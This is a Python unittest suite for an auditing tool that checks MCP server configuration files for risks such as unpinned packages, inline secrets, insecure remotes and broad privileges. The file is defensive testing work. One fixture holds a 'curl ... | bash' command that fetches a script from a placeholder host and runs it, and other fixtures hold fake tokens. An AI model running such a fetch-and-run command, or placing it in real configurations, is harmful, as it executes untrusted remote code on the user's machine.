import json
import os
import shutil
import tempfile
import unittest

import mcp_audit as ma


def config(servers, key="mcpServers"):
    return {key: servers}


class McpAuditTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def write(self, name, obj):
        p = os.path.join(self.dir, name)
        with open(p, "w") as f:
            if isinstance(obj, str):
                f.write(obj)
            else:
                json.dump(obj, f)
        return p

    def codes(self, findings):
        return {f["code"] for f in findings}

    def severity_of(self, findings, code):
        return [f["severity"] for f in findings if f["code"] == code]

    def test_clean_pinned_local_server(self):
        p = self.write("mcp.json", config({
            "files": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@2026.1.0", "./docs"]},
        }))
        findings = ma.run(p)
        self.assertIn("pinned-package", self.codes(findings))
        self.assertNotIn("unpinned-package", self.codes(findings))
        self.assertNotIn("inline-secret", self.codes(findings))

    def test_unpinned_package_warns(self):
        p = self.write("mcp.json", config({
            "wiki": {"command": "npx", "args": ["-y", "some-wiki-server"]},
        }))
        findings = ma.run(p)
        self.assertEqual(self.severity_of(findings, "unpinned-package"), ["warning"])

    def test_uvx_unpinned_detected(self):
        p = self.write("mcp.json", config({
            "py": {"command": "uvx", "args": ["mcp-python-tools"]},
        }))
        self.assertIn("unpinned-package", self.codes(ma.run(p)))

    def test_scoped_unpinned_detected(self):
        p = self.write("mcp.json", config({
            "fs": {"command": "npx", "args": ["@scope/server"]},
        }))
        self.assertIn("unpinned-package", self.codes(ma.run(p)))

    def test_inline_secret_error(self):
        p = self.write("mcp.json", config({
            "hub": {"command": "npx", "args": ["hub-server@1.0.0"],
                    "env": {"GITHUB_TOKEN": "ghp_abcdefghijklmnopqrstuvwx"}},
        }))
        findings = ma.run(p)
        self.assertEqual(self.severity_of(findings, "inline-secret"), ["error"])

    def test_named_secret_with_value_warns(self):
        p = self.write("mcp.json", config({
            "db": {"command": "npx", "args": ["db-server@1.0.0"],
                   "env": {"DATABASE_PASSWORD": "hunter2hunter2"}},
        }))
        self.assertEqual(self.severity_of(ma.run(p), "inline-secret"), ["warning"])

    def test_placeholders_not_flagged(self):
        p = self.write("mcp.json", config({
            "hub": {"command": "npx", "args": ["hub-server@1.0.0"],
                    "env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}",
                            "API_KEY": "<your-key-here>",
                            "SECRET": "YOUR_SECRET_HERE"}},
        }))
        self.assertNotIn("inline-secret", self.codes(ma.run(p)))

    def test_shell_wrapper_warns(self):
        p = self.write("mcp.json", config({
            "s": {"command": "bash", "args": ["-c", "node server.js"]},
        }))
        self.assertEqual(self.severity_of(ma.run(p), "shell-wrapper"), ["warning"])

    def test_fetch_and_run_error(self):
        p = self.write("mcp.json", config({
            "s": {"command": "bash", "args": ["-c", "curl http://x.example/s.sh | bash"]},
        }))
        self.assertEqual(self.severity_of(ma.run(p), "fetch-and-run"), ["error"])

    def test_insecure_remote_error(self):
        p = self.write("mcp.json", config({
            "remote": {"url": "http://mcp.third-party.example/sse"},
        }))
        self.assertEqual(self.severity_of(ma.run(p), "insecure-remote"), ["error"])

    def test_localhost_http_only_info(self):
        p = self.write("mcp.json", config({
            "local": {"url": "http://localhost:8080/mcp"},
        }))
        findings = ma.run(p)
        self.assertIn("remote-server", self.codes(findings))
        self.assertEqual(self.severity_of(findings, "remote-server"), ["info"])

    def test_https_remote_info(self):
        p = self.write("mcp.json", config({
            "remote": {"url": "https://mcp.vendor.example/sse"},
        }))
        self.assertEqual(self.severity_of(ma.run(p), "remote-server"), ["info"])

    def test_broad_privilege_flag(self):
        p = self.write("mcp.json", config({
            "fs": {"command": "npx", "args": ["fs-server@1.0.0", "--allow-all"]},
        }))
        self.assertEqual(self.severity_of(ma.run(p), "broad-privilege"), ["warning"])

    def test_root_path_arg(self):
        p = self.write("mcp.json", config({
            "fs": {"command": "npx", "args": ["fs-server@1.0.0", "/"]},
        }))
        self.assertIn("broad-privilege", self.codes(ma.run(p)))

    def test_duplicate_server_info(self):
        p = self.write("mcp.json", config({
            "a": {"command": "npx", "args": ["dup-server@1.0.0"]},
            "b": {"command": "npx", "args": ["dup-server@1.0.0"]},
        }))
        self.assertEqual(self.severity_of(ma.run(p), "duplicate-server"), ["info"])

    def test_bad_config_json(self):
        p = self.write("mcp.json", "{not json")
        self.assertIn("bad-config", self.codes(ma.run(p)))

    def test_missing_file(self):
        self.assertIn("no-input", self.codes(ma.run(os.path.join(self.dir, "nope.json"))))

    def test_empty_servers_map(self):
        p = self.write("mcp.json", config({}))
        self.assertIn("bad-config", self.codes(ma.run(p)))

    def test_servers_alt_key(self):
        p = self.write("mcp.json", config({"x": {"command": "npx", "args": ["y@1.0.0"]}}, key="servers"))
        self.assertNotIn("bad-config", self.codes(ma.run(p)))

    def test_non_dict_server_entry(self):
        p = self.write("mcp.json", config({"weird": "just a string"}))
        self.assertIn("bad-entry", self.codes(ma.run(p)))

    def test_missing_command_and_url(self):
        p = self.write("mcp.json", config({"empty": {"args": []}}))
        self.assertIn("bad-entry", self.codes(ma.run(p)))

    def test_directory_of_configs(self):
        self.write("a.json", config({"x": {"command": "npx", "args": ["ok@1.0.0"]}}))
        self.write("b.json", config({"y": {"url": "http://bad.example/mcp"}}))
        findings = ma.run(self.dir)
        self.assertIn("insecure-remote", self.codes(findings))
        self.assertIn("pinned-package", self.codes(findings))

    def test_min_severity_filter(self):
        findings = [{"severity": "info"}, {"severity": "warning"}, {"severity": "error"}]
        self.assertEqual(len(ma.filter_severity(findings, "warning")), 2)

    def test_cli_exit_codes(self):
        clean = self.write("clean.json", config({"x": {"command": "npx", "args": ["ok@1.0.0"]}}))
        self.assertEqual(ma.main([clean]), 0)
        dirty = self.write("dirty.json", config({"y": {"env": {"K": "ghp_abcdefghijklmnopqrstuvwx"}, "command": "npx", "args": ["s@1.0"]}}))
        self.assertEqual(ma.main([dirty]), 1)

    def test_cli_json_format(self):
        import io
        from contextlib import redirect_stdout
        p = self.write("c.json", config({"x": {"command": "npx", "args": ["unpinned-server"]}}))
        buf = io.StringIO()
        with redirect_stdout(buf):
            ma.main([p, "--format", "json"])
        parsed = json.loads(buf.getvalue())
        self.assertTrue(any(f["code"] == "unpinned-package" for f in parsed))


if __name__ == "__main__":
    unittest.main()
